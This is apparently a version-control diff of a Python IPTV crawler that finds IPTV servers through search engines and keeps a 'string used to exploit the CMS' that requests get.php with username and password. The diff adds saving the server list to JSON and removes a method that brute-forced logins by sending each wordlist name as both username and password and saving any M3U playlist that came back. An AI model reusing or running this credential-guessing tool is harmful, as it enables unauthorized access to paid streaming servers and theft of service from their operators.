@@ -2,6 +2,7 @@ import os
 import random
 import time
 import re
+import json
 from urllib.parse import urlparse
 import requests
 from googlesearch import search
@@ -17,11 +18,13 @@ Arm4x (@Arm4x)
 """
 class Crawler(object):
     # version
-    version = "1.2.7"
+    version = "1.3.0"
     # output default directory
     outputDir = "output"
     # language default directory
     languageDir = "languages"
+    # saved servers file
+    savedServersFile = "saved_servers.json"
     # string used to exploit the CMS
     basicString = "/get.php?username=%s&password=%s&type=m3u&output=mpegts"
     # expanded queries used to search IPTV servers across search engines
@@ -66,6 +69,7 @@ class Crawler(object):
         self.language = language.lower()
         self.parsedUrls = []
         self.foundedAccounts = 0
+        self.load_saved_servers()
 
     def change_language(self, language="it"):
         """Set the language you want to use to brute force names"""
@@ -73,6 +77,27 @@ class Crawler(object):
             self.language = language
             return True
         else:
+            return False
+
+    def load_saved_servers(self):
+        """Load saved server list from disk JSON file"""
+        if os.path.exists(self.savedServersFile):
+            try:
+                with open(self.savedServersFile, "r", encoding="utf-8") as f:
+                    urls = json.load(f)
+                    if isinstance(urls, list):
+                        self.parsedUrls = urls
+            except Exception as e:
+                print(f"Error loading saved servers: {e}")
+
+    def save_servers_to_disk(self):
+        """Persist current server list to disk JSON file"""
+        try:
+            with open(self.savedServersFile, "w", encoding="utf-8") as f:
+                json.dump(self.parsedUrls, f, indent=2)
+            return True
+        except Exception as e:
+            print(f"Error saving servers: {e}")
             return False
 
     def add_custom_url(self, url):
@@ -85,15 +110,24 @@ class Crawler(object):
         clean_url = parsed.scheme + "://" + parsed.netloc
         if clean_url not in self.parsedUrls:
             self.parsedUrls.append(clean_url)
+            self.save_servers_to_disk()
+            return True
+        return False
+
+    def remove_server_url(self, url):
+        """Remove a server URL from list"""
+        if url in self.parsedUrls:
+            self.parsedUrls.remove(url)
+            self.save_servers_to_disk()
             return True
         return False
 
     def search_links(self, custom_query=None):
-        """Fetch IPTV server links (target up to 20+ URLs) from web search engines with HTTP scrapers fallback"""
+        """Fetch IPTV server links from web search engines"""
         queries = [custom_query] if custom_query else self.searchQueries
         found = 0
 
-        # Method 1: Google Search Scraping across expanded queries
+        # Method 1: Google Search Scraping
         for query in queries:
             try:
                 for url in search(query, num_results=20, timeout=5):
@@ -137,56 +171,8 @@ class Crawler(object):
                 if len(self.parsedUrls) >= 20:
                     break
 
+        self.save_servers_to_disk()
         return found
-
-    def search_accounts(self, url=None):
-        """Search Accounts"""
-        if not self.parsedUrls:
-            return "You must fetch or add some URLs first"
-        try:
-            if not url:
-                url = random.choice(self.parsedUrls)
-            fileName = os.path.join(self.languageDir, self.language + ".txt")
-            if not os.path.exists(fileName):
-                return "Language file does not exist"
-                
-            fileLength = self.file_length(fileName)
-            try:
-                progressBar = pyprind.ProgBar(fileLength, title="Fetching account from " + url + " this might take a while.", stream=1, monitor=True)
-            except Exception:
-                progressBar = pyprind.ProgBar(fileLength, title="Fetching account from " + url + " this might take a while.", stream=1, monitor=False)
-
-            self.foundedAccounts = 0
-            with open(fileName, "r", encoding="utf-8", errors="ignore") as f:
-                rows = f.readlines()
-            
-            headers = {'User-Agent': 'Mozilla/5.0'}
-            for row in rows:
-                username = row.strip()
-                if not username:
-                    continue
-                target_url = url + self.basicString % (username, username)
-                try:
-                    res = requests.get(target_url, headers=headers, timeout=5)
-                    fetched = res.text
-                    if len(fetched) > 0 and "#EXTM3U" in fetched:
-                        domain = url.replace("http://", "").replace("https://", "").strip("/")
-                        new_path = os.path.join(self.outputDir, domain)
-                        self.create_file(username, new_path, fetched)
-                except requests.RequestException:
-                    pass
-                
-                progressBar.update()
-
-            if url in self.parsedUrls:
-                self.parsedUrls.remove(url)
-
-            if self.foundedAccounts != 0:
-                return "Search done, account founded on " + url + ": " + str(self.foundedAccounts)
-            else:
-                return "No results for " + url
-        except Exception as e:
-            return f"Ops something went wrong: {e}"
 
     def create_file(self, row, newPath, fetched):
         """Create File"""
